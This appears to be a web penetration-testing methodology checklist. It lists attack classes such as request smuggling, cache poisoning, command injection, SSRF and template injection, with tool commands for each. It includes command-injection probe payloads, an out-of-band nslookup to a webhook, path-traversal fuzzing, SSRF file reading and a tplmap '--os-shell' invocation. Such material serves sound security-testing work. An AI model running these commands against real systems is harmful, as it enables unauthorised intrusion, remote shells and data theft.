# Methodology

## Proxies
- 🟥 __Abusing hop-by-hop headers__
```bash
// Tool hbh-header-abuse-test
for HEADER in $(cat /usr/share/seclists/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers); do python3 hbh-header-abuse-test.py -u <url> -x "$HEADER" -v; :'sleep 1'; done
```
- 🟥 __Cache Poisoning/Cache Deception__
```bash
// Tool Web-Cache-Vulnerability-Scanner
go install -v github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest
cp go/Web-Cache-Vulnerability-Scanner tools/Web-Cache-Vulnerability-Scanner/wcvs
cd tools/Web-Cache-Vulnerability-Scanner/
./wcvs -u <url> -hw wordlists/headers -pw wordlists/parameters -f
```
- 🟥 __HTTP Request Smuggling__ 
```bash
// Burp - HTTP Request Smuggler
- Right click on a request and click Extensions > HTTP HTTP Request Smuggler > Smuggle Probe.

// Tool Smuggler by gwen001
wget https://raw.githubusercontent.com/gwen001/pentest-tools/master/smuggler.py
python3 smuggler.py -u <url> -v 3
```
- 🟥 __H2C Smuggling__
```
// Tool h2csmuggler
python3 h2csmuggler.py -x <url> -t --threads 5 -v
```
- 🟥 __Uncovering Cloudflare__
- 🟥 __XSLT Server Side Injection__

## User input
### Reflected Values
- 🟥 __Client Side Template Injection__ (Like SSTI)
- 🟥 __Command Injection__
```
// Tool commix
commix -r <REQUESTFILE> -p <TEST_PARAMETER>

// Test delay
original_cmd_by_server;sleep+5
original_cmd_by_server&&sleep+5
original_cmd_by_server|sleep+5
original_cmd_by_server||sleep+5

// Test when no effect on the application's response
original_cmd_by_server;nslookup+<webhook>
```
- 🟥 __CRLF__
```
// Tool crlfuzz
crlfuzz -u <url>
```
- 🟥 __Dangling Markup__
- 🟥 __File Inclusion/Path Traversal__ (Detected by 👉 Burp Scanner)
```
// Fast Fuzzing
wfuzz -c -w /usr/share/wfuzz/wordlist/Injections/Traversal.txt --hw 0 http://10.10.10.10/nav.php?page=FUZZ
// Deep Fuzzing (recommend)
wfuzz -X GET -c -w file_inclusion_linux.txt --hw 0 http://10.10.10.10/nav.php?page=FUZZ
wfuzz -X POST -c -w file_inclusion_linux.txt --hw 0 -d "foo=FUZZ" http://10.10.10.10/nav.php
```
- 🟥 __Open Redirect__ (Detected by 👉 Burp Scanner)
- 🟥 __Prototype Pollution to XSS__ (NodeJS)
- 🟥 __Server Side Inclusion/Edge Side Inclusion__ (Detected by 👉 Burp Scanner)
- 🟥 __Server Side Request Forgery__
```
// Tool SSRFmap
python3 ssrfmap.py -r <REQFILE> -p <PARAM> -m readfiles,portscan

// Tool Gopherus (SSRF to RCE)
https://github.com/tarunkant/Gopherus
```
- 🟥 __Server Side Template Injection__ (Detected by 👉 Burp Scanner)
```
// Tool tplmap
python2 tplmap.py -u 'http://10.10.10.10/page?name=Box*' --os-shell
```
- 🟥 __Reverse Tab Nabbing__
- 🟥 __XSLT Server Side Injection__
- 🟥 __XSS__
- 🟥 __XSSI__
- 🟥 __XS-Search__

